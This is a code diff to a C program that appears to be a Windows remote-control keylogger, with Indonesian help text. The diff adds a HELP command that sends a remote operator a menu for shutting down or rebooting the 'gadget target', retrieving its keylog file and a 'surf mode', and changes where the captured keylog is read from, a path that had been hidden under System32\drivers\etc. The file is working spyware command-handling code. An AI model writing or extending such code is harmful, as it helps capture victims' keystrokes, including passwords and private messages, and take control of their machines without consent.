@@ -62,16 +62,58 @@ void HALLO(void * paramT){
 	send((param)->clientSocket, "HALLO", 6, 0);
 }
 
+void HELP(void * paramT){
+	if(paramT == NULL) return;
+
+	paramThread * param = (paramThread *)paramT;
+
+	char buffer[128] = {0};
+
+	strcpy(buffer, "     ");
+	send((param)->clientSocket, buffer, strlen(buffer), 0);
+	memset(buffer, 0, strlen(buffer));
+	Sleep(101);
+
+	strcpy(buffer, "SHUTDOWN:\tShutdown gadget target");
+	send((param)->clientSocket, buffer, strlen(buffer), 0);
+	memset(buffer, 0, strlen(buffer));
+	Sleep(101);
+
+	strcpy(buffer, "REBOOT:\t\tReboot gadget target");
+	send((param)->clientSocket, buffer, strlen(buffer), 0);
+	memset(buffer, 0, strlen(buffer));
+	Sleep(101);
+
+	strcpy(buffer, "HALLO:\t\tCheck koneksi dengan gadget target mengirim pesan \"HALLO\"");
+	send((param)->clientSocket, buffer, strlen(buffer), 0);
+	memset(buffer, 0, strlen(buffer));
+	Sleep(101);
+
+	strcpy(buffer, "HELP:\t\tMemperlihatkan pesan ini");
+	send((param)->clientSocket, buffer, strlen(buffer), 0);
+	memset(buffer, 0, strlen(buffer));
+	Sleep(101);
+
+	strcpy(buffer, "GETKEYLOG:\tMendapatkan file keylog");
+	send((param)->clientSocket, buffer, strlen(buffer), 0);
+	memset(buffer, 0, strlen(buffer));
+	Sleep(101);
+
+	strcpy(buffer, "SURFMODE:\tAktivasi mode surf");
+	send((param)->clientSocket, buffer, strlen(buffer), 0);
+	memset(buffer, 0, strlen(buffer));
+	Sleep(101);
+}
+
 void GETKEYLOG(void * paramT){
 	if(paramT == NULL) return;
 
 	paramThread * param = (paramThread *)paramT;
 
-	#define KEYLOG_PATH "C:\\Windows\\System32\\drivers\\etc\\log"
-	
 	char buffer[128] = {0};
 	
-	FILE * source_file = fopen(KEYLOG_PATH, "r");
+	//FILE * source_file = fopen("C:\\Windows\\System32\\drivers\\etc\\log", "r");
+	FILE * source_file = fopen("log", "r");
 
 	if (source_file == NULL){
 		perror("");
